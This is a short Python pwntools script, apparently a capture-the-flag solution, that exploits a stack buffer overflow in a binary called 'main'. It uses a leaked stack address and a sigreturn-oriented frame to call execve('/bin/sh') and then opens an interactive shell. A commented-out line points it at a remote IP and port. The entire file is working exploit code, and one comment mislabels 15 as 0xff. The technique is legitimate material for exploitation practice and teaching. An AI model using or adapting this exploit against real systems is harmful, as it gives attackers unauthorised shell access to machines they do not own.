from pwn import *
elf=context.binary=ELF('./main')
# p = remote('193.57.159.27',23866)
p = process()

syscall_ret = 0x000000000040114a  ### address if syscall instruction
set_rax = 0x0000000000401154	##### address of set rax ---> setting rax to 15 (0xff)

p.recvuntil(b"broo : ")
leak = int(p.recvline().strip(), 16)
log.info(f"Stack leak @ {hex(leak)}")

# Calculate buf address
buf_addr = leak

bin_sh=b'/bin/sh\x00'

payload = bin_sh.ljust(72,b'A')

print(payload)
# payload = b'A'*72
payload += p64(set_rax)
payload += p64(syscall_ret)

frame = SigreturnFrame()
frame.rax = 0x3b # sys_execve()
frame.rdi = buf_addr # const char *filename \bin\sh is stored in buff_addr
frame.rsi = 0 # const char *const argv[]
frame.rdx = 0 # const char *const envp[]
frame.rsp = buf_addr # a valid writable address
frame.rip = syscall_ret # syscall;ret

payload += bytes(frame)

print(len(payload))
p.send(payload)

p.interactive()
# print(p.recvall().decode('latin-1'))